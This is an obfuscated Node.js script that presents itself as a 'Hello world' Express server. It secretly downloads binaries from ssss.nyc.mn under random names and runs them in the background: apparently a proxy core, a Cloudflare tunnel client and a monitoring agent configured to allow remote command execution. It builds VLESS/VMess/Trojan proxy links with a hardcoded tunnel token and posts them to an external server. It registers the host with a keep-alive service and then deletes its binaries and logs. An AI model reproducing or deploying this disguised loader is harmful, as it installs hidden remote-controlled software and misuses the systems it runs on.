const _0xcc7350=_0x1d09;(function(_0x2551c6,_0x37e2c5){const _0x3b9b35=_0x1d09,_0x408af2=_0x2551c6();while(!![]){try{const _0x45b004=parseInt(_0x3b9b35(0xb8))/0x1*(parseInt(_0x3b9b35(0xe0))/0x2)+-parseInt(_0x3b9b35(0xe3))/0x3+-parseInt(_0x3b9b35(0x116))/0x4*(parseInt(_0x3b9b35(0x98))/0x5)+parseInt(_0x3b9b35(0xa3))/0x6*(parseInt(_0x3b9b35(0x84))/0x7)+parseInt(_0x3b9b35(0xb9))/0x8+parseInt(_0x3b9b35(0x12a))/0x9+-parseInt(_0x3b9b35(0xec))/0xa*(parseInt(_0x3b9b35(0xd3))/0xb);if(_0x45b004===_0x37e2c5)break;else _0x408af2['push'](_0x408af2['shift']());}catch(_0x50d747){_0x408af2['push'](_0x408af2['shift']());}}}(_0x2ce2,0x88f9e));const express=require(_0xcc7350(0xfa)),app=express(),axios=require(_0xcc7350(0x7a)),os=require('os'),fs=require('fs'),path=require(_0xcc7350(0x119)),{promisify}=require('util'),exec=promisify(require('child_process')['exec']),{execSync}=require(_0xcc7350(0xc0)),UPLOAD_URL=process[_0xcc7350(0x11a)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0xcc7350(0x136)]||'',AUTO_ACCESS=process[_0xcc7350(0x11a)][_0xcc7350(0x100)]||![],FILE_PATH=process[_0xcc7350(0x11a)][_0xcc7350(0xc4)]||_0xcc7350(0xea),SUB_PATH=process[_0xcc7350(0x11a)][_0xcc7350(0xb7)]||_0xcc7350(0x106),PORT=process[_0xcc7350(0x11a)][_0xcc7350(0x79)]||process[_0xcc7350(0x11a)][_0xcc7350(0x123)]||0xbb8,UUID=process[_0xcc7350(0x11a)][_0xcc7350(0x10f)]||_0xcc7350(0xa7),NEZHA_SERVER=process[_0xcc7350(0x11a)][_0xcc7350(0x78)]||'',NEZHA_PORT=process[_0xcc7350(0x11a)][_0xcc7350(0xba)]||'',NEZHA_KEY=process[_0xcc7350(0x11a)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xcc7350(0x11a)][_0xcc7350(0xa1)]||_0xcc7350(0xb0),ARGO_AUTH=process[_0xcc7350(0x11a)][_0xcc7350(0xd8)]||_0xcc7350(0x95),ARGO_PORT=process[_0xcc7350(0x11a)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0xcc7350(0x81)]||_0xcc7350(0x110),CFPORT=process[_0xcc7350(0x11a)]['CFPORT']||0x1bb,NAME=process[_0xcc7350(0x11a)][_0xcc7350(0x9d)]||'1029';!fs[_0xcc7350(0xe5)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0xcc7350(0xd7)](FILE_PATH+'\x20is\x20created')):console[_0xcc7350(0xd7)](FILE_PATH+_0xcc7350(0xf6));function generateRandomName(){const _0xac247f=_0xcc7350,_0x26d417=_0xac247f(0xee);let _0x489270='';for(let _0x369fb4=0x0;_0x369fb4<0x6;_0x369fb4++){_0x489270+=_0x26d417[_0xac247f(0xa5)](Math[_0xac247f(0x11e)](Math[_0xac247f(0x7e)]()*_0x26d417[_0xac247f(0xbb)]));}return _0x489270;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xcc7350(0x10a)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xcc7350(0x10a)](FILE_PATH,botName),subPath=path[_0xcc7350(0x10a)](FILE_PATH,_0xcc7350(0xe7)),listPath=path[_0xcc7350(0x10a)](FILE_PATH,_0xcc7350(0x101)),bootLogPath=path[_0xcc7350(0x10a)](FILE_PATH,_0xcc7350(0x88)),configPath=path[_0xcc7350(0x10a)](FILE_PATH,_0xcc7350(0xc6));function deleteNodes(){const _0x1bdb20=_0xcc7350;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x59ac8a;try{_0x59ac8a=fs['readFileSync'](subPath,_0x1bdb20(0x87));}catch{return null;}const _0x1bbdca=Buffer[_0x1bdb20(0xc8)](_0x59ac8a,'base64')[_0x1bdb20(0xc9)]('utf-8'),_0x2951fb=_0x1bbdca[_0x1bdb20(0x125)]('\x0a')['filter'](_0x427947=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1bdb20(0xa9)](_0x427947));if(_0x2951fb[_0x1bdb20(0xbb)]===0x0)return;return axios[_0x1bdb20(0x7f)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x1bdb20(0xb1)]({'nodes':_0x2951fb}),{'headers':{'Content-Type':_0x1bdb20(0x126)}})[_0x1bdb20(0xfd)](_0x39e6de=>{return null;}),null;}catch(_0x488190){return null;}}function cleanupOldFiles(){const _0xd7aa09=_0xcc7350;try{const _0x28c141=fs[_0xd7aa09(0xa6)](FILE_PATH);_0x28c141[_0xd7aa09(0x86)](_0x1f15e4=>{const _0x5bc742=_0xd7aa09,_0x5c978c=path['join'](FILE_PATH,_0x1f15e4);try{const _0xa8b66f=fs[_0x5bc742(0x10c)](_0x5c978c);_0xa8b66f[_0x5bc742(0xe1)]()&&fs[_0x5bc742(0xdb)](_0x5c978c);}catch(_0x4c3a07){}});}catch(_0xa95712){}}app[_0xcc7350(0xae)]('/',function(_0x1948f7,_0x7f12c1){const _0x4aff14=_0xcc7350;_0x7f12c1[_0x4aff14(0xb3)](_0x4aff14(0xf5));});async function generateConfig(){const _0x3376ab=_0xcc7350,_0xc39821={'log':{'access':_0x3376ab(0x83),'error':_0x3376ab(0x83),'loglevel':_0x3376ab(0xd4)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3376ab(0x108),'settings':{'clients':[{'id':UUID,'flow':_0x3376ab(0xcf)}],'decryption':_0x3376ab(0xd4),'fallbacks':[{'dest':0xbb9},{'path':_0x3376ab(0x99),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x3376ab(0xd0),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x3376ab(0x11c),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3376ab(0x108),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3376ab(0xd4)},'streamSettings':{'network':'ws','security':_0x3376ab(0xd4),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3376ab(0x8c),_0x3376ab(0x13a),_0x3376ab(0xdc)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3376ab(0x129),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3376ab(0x131)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3376ab(0x13a),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3376ab(0x11c),'protocol':_0x3376ab(0xc1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3376ab(0xd4),'wsSettings':{'path':_0x3376ab(0xd0)}},'sniffing':{'enabled':!![],'destOverride':[_0x3376ab(0x8c),'tls',_0x3376ab(0xdc)],'metadataOnly':![]}}],'dns':{'servers':[_0x3376ab(0x103)]},'outbounds':[{'protocol':_0x3376ab(0xcc),'tag':_0x3376ab(0xab)},{'protocol':_0x3376ab(0x11f),'tag':_0x3376ab(0x7b)}]};fs[_0x3376ab(0xd9)](path[_0x3376ab(0x10a)](FILE_PATH,_0x3376ab(0xc6)),JSON['stringify'](_0xc39821,null,0x2));}function getSystemArchitecture(){const _0x371e40=_0xcc7350,_0x7d13a4=os[_0x371e40(0xb6)]();return _0x7d13a4==='arm'||_0x7d13a4===_0x371e40(0xc3)||_0x7d13a4==='aarch64'?_0x371e40(0xfb):_0x371e40(0xcd);}function _0x2ce2(){const _0x4da27d=['PORT','https://arm64.ssss.nyc.mn/web','split','application/json','\x0a\x20\x20\x0avmess://','\x20successfully','vmess','2455119EGmbOr','\x0a\x20\x20tunnel:\x20','automatic\x20access\x20task\x20added\x20successfully','push','\x20-p\x20','\x22\x20>\x20/dev/null\x202>&1','basename','/vmess-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20-c\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','platform','PROJECT_URL','config.yaml','2087','\x20-c\x20\x22','tls','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','php\x20running\x20error:\x20','data','trim','NEZHA_SERVER','SERVER_PORT','axios','block','https://amd64.ssss.nyc.mn/v1','\x20is\x20running','random','post','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','CFIP','App\x20is\x20running','/dev/null','414764STqRRS','ARGO_DOMAIN:','forEach','utf-8','boot.log','https://amd64.ssss.nyc.mn/agent','2083','?security=tls&sni=','http','includes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x20\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','substring','error','&path=%2Ftrojan-argo%3Fed%3D2560#','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','eyJhIjoiNzljOGMxNzk1NDRlOTYxYzAwZjI3MTYxYjkzODI5OGEiLCJ0IjoiMzk5YzFkNTktZWVkYi00YzM2LWE0Y2YtNWJiYWIzYTcyNjRkIiwicyI6Ik9UUTVObU0xWW1ZdE5UZzBOUzAwTnpCaUxXSXpZelF0WTJKaE5UUXpOek0wWTJSaSJ9','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','finish','167415OPcOXK','/vless-argo','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&fp=firefox&type=ws&host=','Error\x20downloading\x20files:','NAME','/tunnel.yml\x20run','chmod','\x0avless://','ARGO_DOMAIN','\x0aclient_secret:\x20','84oVEfbr','all','charAt','readdirSync','c8f48026-3788-4e56-9fc2-144f94820dc3','Error\x20in\x20startserver:','test','unlink','direct','https://arm64.ssss.nyc.mn/bot','createWriteStream','get','http\x20server\x20is\x20running\x20on\x20port:','a.a805306425.dpdns.org','stringify','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','send','message','status','arch','SUB_PATH','183721QcISFJ','2950552FXbIKc','NEZHA_PORT','length','listen','pkill\x20-f\x20\x22[','.exe\x20>\x20nul\x202>&1','then','child_process','trojan','pop','arm64','FILE_PATH','8443','config.json','del\x20/f\x20/q\x20','from','toString','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','response','freedom','amd','&path=%2Fvless-argo%3Fed%3D2560#','xtls-rprx-vision','/trojan-argo','\x20>\x20nul\x202>&1','clear','31361rBSiDw','none','taskkill\x20/f\x20/im\x20','fileName','log','ARGO_AUTH','writeFileSync','Skipping\x20adding\x20automatic\x20access\x20task','unlinkSync','quic','Subscription\x20uploaded\x20successfully','has','?encryption=none&security=tls&sni=','6INDqtM','isFile','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','3240021MYKOHY','web\x20running\x20error:\x20','existsSync','https://oooo.serv00.net/add-url','sub.txt','Error\x20reading\x20boot.log:','base64','./tmp','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','750XVdLXg','Empowerment\x20success\x20for\x20','abcdefghijklmnopqrstuvwxyz','mkdirSync','2096','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://arm64.ssss.nyc.mn/v1','/config.json\x20>/dev/null\x202>&1\x20&','win32','Hello\x20world!','\x20already\x20exists','Download\x20','npm\x20running\x20error:\x20','filter','express','arm','\x20failed:\x20','catch','unshift','--tls','AUTO_ACCESS','list.txt','tunnel.json','https+local://8.8.8.8/dns-query','Nodes\x20uploaded\x20successfully','\x0a\x20\x20credentials-file:\x20','sub','\x0a\x20\x20\x0atrojan://','vless','fileUrl','join','text/plain;\x20charset=utf-8','statSync','nohup\x20','\x20>/dev/null\x202>&1','UUID','cdns.doon.eu.org','pipe','/sub.txt\x20saved\x20successfully','set','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel.yml','20QCfAFv','map','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','path','env','\x20>/dev/null\x202>&1\x20&','127.0.0.1','\x20-s\x20','floor','blackhole','match','TunnelSecret','https://amd64.ssss.nyc.mn/bot'];_0x2ce2=function(){return _0x4da27d;};return _0x2ce2();}function downloadFile(_0x31476a,_0x11bd5c,_0x46d8ae){const _0x285966=_0xcc7350,_0x3f9744=_0x31476a;!fs[_0x285966(0xe5)](FILE_PATH)&&fs[_0x285966(0xef)](FILE_PATH,{'recursive':!![]});const _0x5d0f1d=fs[_0x285966(0xad)](_0x3f9744);axios({'method':_0x285966(0xae),'url':_0x11bd5c,'responseType':'stream'})[_0x285966(0xbf)](_0x11eabe=>{const _0x373acc=_0x285966;_0x11eabe[_0x373acc(0x76)][_0x373acc(0x111)](_0x5d0f1d),_0x5d0f1d['on'](_0x373acc(0x97),()=>{const _0x85e48=_0x373acc;_0x5d0f1d['close'](),console[_0x85e48(0xd7)](_0x85e48(0xf7)+path['basename'](_0x3f9744)+_0x85e48(0x128)),_0x46d8ae(null,_0x3f9744);}),_0x5d0f1d['on'](_0x373acc(0x92),_0x4c0393=>{const _0x5c040d=_0x373acc;fs[_0x5c040d(0xaa)](_0x3f9744,()=>{});const _0x417192=_0x5c040d(0xf7)+path[_0x5c040d(0x130)](_0x3f9744)+'\x20failed:\x20'+_0x4c0393['message'];console[_0x5c040d(0x92)](_0x417192),_0x46d8ae(_0x417192);});})[_0x285966(0xfd)](_0x576a66=>{const _0x16c2cb=_0x285966,_0x355373=_0x16c2cb(0xf7)+path['basename'](_0x3f9744)+_0x16c2cb(0xfc)+_0x576a66[_0x16c2cb(0xb4)];console['error'](_0x355373),_0x46d8ae(_0x355373);});}async function downloadFilesAndRun(){const _0x45e7ec=_0xcc7350,_0x396c95=getSystemArchitecture(),_0xf5a832=getFilesForArchitecture(_0x396c95);if(_0xf5a832[_0x45e7ec(0xbb)]===0x0){console[_0x45e7ec(0xd7)](_0x45e7ec(0x94));return;}const _0x5645f1=_0xf5a832[_0x45e7ec(0x117)](_0x3a72ff=>{return new Promise((_0x4b9e2b,_0x22d6c5)=>{const _0x566b74=_0x1d09;downloadFile(_0x3a72ff[_0x566b74(0xd6)],_0x3a72ff[_0x566b74(0x109)],(_0x39ebff,_0x3965ee)=>{_0x39ebff?_0x22d6c5(_0x39ebff):_0x4b9e2b(_0x3965ee);});});});try{await Promise[_0x45e7ec(0xa4)](_0x5645f1);}catch(_0x121c71){console[_0x45e7ec(0x92)](_0x45e7ec(0x9c),_0x121c71);return;}function _0x481b4b(_0x2e3625){const _0x2a3efd=_0x45e7ec,_0xff8133=0x1fd;_0x2e3625[_0x2a3efd(0x86)](_0x16549f=>{const _0x370f5f=_0x2a3efd;fs['existsSync'](_0x16549f)&&fs[_0x370f5f(0x9f)](_0x16549f,_0xff8133,_0x200723=>{const _0x480929=_0x370f5f;_0x200723?console[_0x480929(0x92)]('Empowerment\x20failed\x20for\x20'+_0x16549f+':\x20'+_0x200723):console['log'](_0x480929(0xed)+_0x16549f+':\x20'+_0xff8133['toString'](0x8));});});}const _0x5d31b0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x481b4b(_0x5d31b0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xc8f389=NEZHA_SERVER[_0x45e7ec(0x8d)](':')?NEZHA_SERVER['split'](':')[_0x45e7ec(0xc2)]():'',_0xb3287f=new Set(['443','8443',_0x45e7ec(0xf0),_0x45e7ec(0x138),_0x45e7ec(0x8a),'2053']),_0x5a1252=_0xb3287f[_0x45e7ec(0xde)](_0xc8f389)?'true':'false',_0x26c411=_0x45e7ec(0xa2)+NEZHA_KEY+_0x45e7ec(0xb2)+NEZHA_SERVER+_0x45e7ec(0xe2)+_0x5a1252+_0x45e7ec(0xeb)+UUID;fs['writeFileSync'](path[_0x45e7ec(0x10a)](FILE_PATH,_0x45e7ec(0x137)),_0x26c411);const _0x4198b0=_0x45e7ec(0x10d)+phpPath+_0x45e7ec(0x139)+FILE_PATH+_0x45e7ec(0x80);try{await exec(_0x4198b0),console[_0x45e7ec(0xd7)](phpName+'\x20is\x20running'),await new Promise(_0x4fd4bc=>setTimeout(_0x4fd4bc,0x3e8));}catch(_0x405d9f){console[_0x45e7ec(0x92)](_0x45e7ec(0x13c)+_0x405d9f);}}else{let _0x1dcd12='';const _0x2509bf=['443',_0x45e7ec(0xc5),_0x45e7ec(0xf0),_0x45e7ec(0x138),_0x45e7ec(0x8a),'2053'];_0x2509bf[_0x45e7ec(0x8d)](NEZHA_PORT)&&(_0x1dcd12=_0x45e7ec(0xff));const _0x22f5f4=_0x45e7ec(0x10d)+npmPath+_0x45e7ec(0x11d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x45e7ec(0x12e)+NEZHA_KEY+'\x20'+_0x1dcd12+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x22f5f4),console['log'](npmName+_0x45e7ec(0x7d)),await new Promise(_0x57c0c6=>setTimeout(_0x57c0c6,0x3e8));}catch(_0x129d80){console['error'](_0x45e7ec(0xf8)+_0x129d80);}}}else console[_0x45e7ec(0xd7)](_0x45e7ec(0x114));const _0x4d7fbc=_0x45e7ec(0x10d)+webPath+_0x45e7ec(0x133)+FILE_PATH+_0x45e7ec(0xf3);try{await exec(_0x4d7fbc),console[_0x45e7ec(0xd7)](webName+_0x45e7ec(0x7d)),await new Promise(_0x2200a5=>setTimeout(_0x2200a5,0x3e8));}catch(_0x1e4f6e){console[_0x45e7ec(0x92)](_0x45e7ec(0xe4)+_0x1e4f6e);}if(fs[_0x45e7ec(0xe5)](botPath)){let _0x423959;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x423959=_0x45e7ec(0xca)+ARGO_AUTH;else ARGO_AUTH[_0x45e7ec(0x120)](/TunnelSecret/)?_0x423959=_0x45e7ec(0x96)+FILE_PATH+_0x45e7ec(0x9e):_0x423959=_0x45e7ec(0x8e)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x45e7ec(0x10d)+botPath+'\x20'+_0x423959+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x443b21=>setTimeout(_0x443b21,0x7d0));}catch(_0x383224){console[_0x45e7ec(0x92)]('Error\x20executing\x20command:\x20'+_0x383224);}}await new Promise(_0x189c8f=>setTimeout(_0x189c8f,0x1388));}function getFilesForArchitecture(_0xd68464){const _0x4c89cd=_0xcc7350;let _0x24fbe0;_0xd68464===_0x4c89cd(0xfb)?_0x24fbe0=[{'fileName':webPath,'fileUrl':_0x4c89cd(0x124)},{'fileName':botPath,'fileUrl':_0x4c89cd(0xac)}]:_0x24fbe0=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4c89cd(0x122)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5696f8=_0xd68464===_0x4c89cd(0xfb)?'https://arm64.ssss.nyc.mn/agent':_0x4c89cd(0x89);_0x24fbe0[_0x4c89cd(0xfe)]({'fileName':npmPath,'fileUrl':_0x5696f8});}else{const _0x10c6d5=_0xd68464===_0x4c89cd(0xfb)?_0x4c89cd(0xf2):_0x4c89cd(0x7c);_0x24fbe0[_0x4c89cd(0xfe)]({'fileName':phpPath,'fileUrl':_0x10c6d5});}}return _0x24fbe0;}function _0x1d09(_0x232072,_0x277c69){const _0x2ce2f7=_0x2ce2();return _0x1d09=function(_0x1d09fa,_0x31238a){_0x1d09fa=_0x1d09fa-0x76;let _0x448acc=_0x2ce2f7[_0x1d09fa];return _0x448acc;},_0x1d09(_0x232072,_0x277c69);}function argoType(){const _0x5986f0=_0xcc7350;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5986f0(0xd7)](_0x5986f0(0x118));return;}if(ARGO_AUTH[_0x5986f0(0x8d)](_0x5986f0(0x121))){fs[_0x5986f0(0xd9)](path['join'](FILE_PATH,_0x5986f0(0x102)),ARGO_AUTH);const _0x387b7f=_0x5986f0(0x12b)+ARGO_AUTH['split']('\x22')[0xb]+_0x5986f0(0x105)+path[_0x5986f0(0x10a)](FILE_PATH,_0x5986f0(0x102))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x5986f0(0xf1)+ARGO_PORT+_0x5986f0(0x132);fs[_0x5986f0(0xd9)](path[_0x5986f0(0x10a)](FILE_PATH,_0x5986f0(0x115)),_0x387b7f);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x45a612=_0xcc7350;let _0x191bc4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x191bc4=ARGO_DOMAIN,console[_0x45a612(0xd7)](_0x45a612(0x85),_0x191bc4),await _0x4345bd(_0x191bc4);else try{const _0x2ef748=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x45a612(0x87)),_0x46cbcb=_0x2ef748[_0x45a612(0x125)]('\x0a'),_0xf35a94=[];_0x46cbcb[_0x45a612(0x86)](_0x269a3e=>{const _0x2873e8=_0x45a612,_0x542c16=_0x269a3e['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x542c16){const _0xf214dc=_0x542c16[0x1];_0xf35a94[_0x2873e8(0x12d)](_0xf214dc);}});if(_0xf35a94[_0x45a612(0xbb)]>0x0)_0x191bc4=_0xf35a94[0x0],console[_0x45a612(0xd7)]('ArgoDomain:',_0x191bc4),await _0x4345bd(_0x191bc4);else{console['log'](_0x45a612(0x90)),fs['unlinkSync'](path[_0x45a612(0x10a)](FILE_PATH,'boot.log'));async function _0xeff529(){const _0x521f28=_0x45a612;try{process[_0x521f28(0x135)]===_0x521f28(0xf4)?await exec(_0x521f28(0xd5)+botName+_0x521f28(0xbe)):await exec(_0x521f28(0xbd)+botName[_0x521f28(0xa5)](0x0)+']'+botName[_0x521f28(0x91)](0x1)+_0x521f28(0x12f));}catch(_0x4c65ed){}}_0xeff529(),await new Promise(_0x43ed83=>setTimeout(_0x43ed83,0xbb8));const _0x3c753d=_0x45a612(0x8e)+FILE_PATH+_0x45a612(0x13b)+ARGO_PORT;try{await exec(_0x45a612(0x10d)+botPath+'\x20'+_0x3c753d+_0x45a612(0x11b)),console['log'](botName+_0x45a612(0x7d)),await new Promise(_0x33caaf=>setTimeout(_0x33caaf,0xbb8)),await extractDomains();}catch(_0x905687){console[_0x45a612(0x92)]('Error\x20executing\x20command:\x20'+_0x905687);}}}catch(_0x4d5a7b){console['error'](_0x45a612(0xe8),_0x4d5a7b);}async function _0x4345bd(_0x5a47d9){const _0x36fbb7=_0x45a612,_0x372a90=execSync(_0x36fbb7(0x134),{'encoding':_0x36fbb7(0x87)}),_0x361891=_0x372a90[_0x36fbb7(0x77)](),_0x250b6d=NAME?NAME+'-'+_0x361891:_0x361891;return new Promise(_0x471db0=>{setTimeout(()=>{const _0x4b135d=_0x1d09,_0x582e2b={'v':'2','ps':''+_0x250b6d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4b135d(0xd4),'net':'ws','type':_0x4b135d(0xd4),'host':_0x5a47d9,'path':'/vmess-argo?ed=2560','tls':_0x4b135d(0x13a),'sni':_0x5a47d9,'alpn':'','fp':'firefox'},_0x4cc1d9=_0x4b135d(0xa0)+UUID+'@'+CFIP+':'+CFPORT+_0x4b135d(0xdf)+_0x5a47d9+_0x4b135d(0x9b)+_0x5a47d9+_0x4b135d(0xce)+_0x250b6d+_0x4b135d(0x127)+Buffer[_0x4b135d(0xc8)](JSON[_0x4b135d(0xb1)](_0x582e2b))[_0x4b135d(0xc9)](_0x4b135d(0xe9))+_0x4b135d(0x107)+UUID+'@'+CFIP+':'+CFPORT+_0x4b135d(0x8b)+_0x5a47d9+_0x4b135d(0x9b)+_0x5a47d9+_0x4b135d(0x93)+_0x250b6d+_0x4b135d(0x8f);console[_0x4b135d(0xd7)](Buffer[_0x4b135d(0xc8)](_0x4cc1d9)[_0x4b135d(0xc9)]('base64')),fs[_0x4b135d(0xd9)](subPath,Buffer[_0x4b135d(0xc8)](_0x4cc1d9)[_0x4b135d(0xc9)](_0x4b135d(0xe9))),console['log'](FILE_PATH+_0x4b135d(0x112)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5a0e1b,_0x126af5)=>{const _0x245c44=_0x4b135d,_0x2ca1ca=Buffer[_0x245c44(0xc8)](_0x4cc1d9)[_0x245c44(0xc9)]('base64');_0x126af5[_0x245c44(0x113)]('Content-Type',_0x245c44(0x10b)),_0x126af5[_0x245c44(0xb3)](_0x2ca1ca);}),_0x471db0(_0x4cc1d9);},0x7d0);});}}async function uploadNodes(){const _0x42bbc7=_0xcc7350;if(UPLOAD_URL&&PROJECT_URL){const _0x31e331=PROJECT_URL+'/'+SUB_PATH,_0x1e3013={'subscription':[_0x31e331]};try{const _0x5541a2=await axios[_0x42bbc7(0x7f)](UPLOAD_URL+'/api/add-subscriptions',_0x1e3013,{'headers':{'Content-Type':_0x42bbc7(0x126)}});return _0x5541a2&&_0x5541a2['status']===0xc8?(console[_0x42bbc7(0xd7)](_0x42bbc7(0xdd)),_0x5541a2):null;}catch(_0x2e6872){if(_0x2e6872[_0x42bbc7(0xcb)]){if(_0x2e6872[_0x42bbc7(0xcb)][_0x42bbc7(0xb5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x42bbc7(0xe5)](listPath))return;const _0x226e75=fs['readFileSync'](listPath,_0x42bbc7(0x87)),_0x2450d0=_0x226e75['split']('\x0a')[_0x42bbc7(0xf9)](_0x302943=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x302943));if(_0x2450d0[_0x42bbc7(0xbb)]===0x0)return;const _0x354bfd=JSON[_0x42bbc7(0xb1)]({'nodes':_0x2450d0});try{const _0x3b7b99=await axios[_0x42bbc7(0x7f)](UPLOAD_URL+'/api/add-nodes',_0x354bfd,{'headers':{'Content-Type':_0x42bbc7(0x126)}});return _0x3b7b99&&_0x3b7b99['status']===0xc8?(console[_0x42bbc7(0xd7)](_0x42bbc7(0x104)),_0x3b7b99):null;}catch(_0x35c200){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x26749f=_0x1d09,_0x1e5d74=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1e5d74['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1e5d74[_0x26749f(0x12d)](phpPath);process['platform']===_0x26749f(0xf4)?exec(_0x26749f(0xc7)+_0x1e5d74[_0x26749f(0x10a)]('\x20')+_0x26749f(0xd1),_0x31d1bb=>{const _0x1ddad4=_0x26749f;console[_0x1ddad4(0xd2)](),console[_0x1ddad4(0xd7)]('App\x20is\x20running'),console[_0x1ddad4(0xd7)](_0x1ddad4(0x9a));}):exec('rm\x20-rf\x20'+_0x1e5d74[_0x26749f(0x10a)]('\x20')+_0x26749f(0x10e),_0x21fcb1=>{const _0x1cf965=_0x26749f;console[_0x1cf965(0xd2)](),console[_0x1cf965(0xd7)](_0x1cf965(0x82)),console[_0x1cf965(0xd7)](_0x1cf965(0x9a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5ab9f2=_0xcc7350;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5ab9f2(0xd7)](_0x5ab9f2(0xda));return;}try{const _0x13e1e3=await axios[_0x5ab9f2(0x7f)](_0x5ab9f2(0xe6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5ab9f2(0x126)}});return console[_0x5ab9f2(0xd7)](_0x5ab9f2(0x12c)),_0x13e1e3;}catch(_0x55bb9f){return console[_0x5ab9f2(0x92)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x55bb9f[_0x5ab9f2(0xb4)]),null;}}async function startserver(){const _0xa41698=_0xcc7350;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x252556){console[_0xa41698(0x92)](_0xa41698(0xa8),_0x252556);}}startserver()[_0xcc7350(0xfd)](_0x4ab98f=>{const _0x26a1d3=_0xcc7350;console[_0x26a1d3(0x92)]('Unhandled\x20error\x20in\x20startserver:',_0x4ab98f);}),app[_0xcc7350(0xbc)](PORT,()=>console[_0xcc7350(0xd7)](_0xcc7350(0xaf)+PORT+'!'));
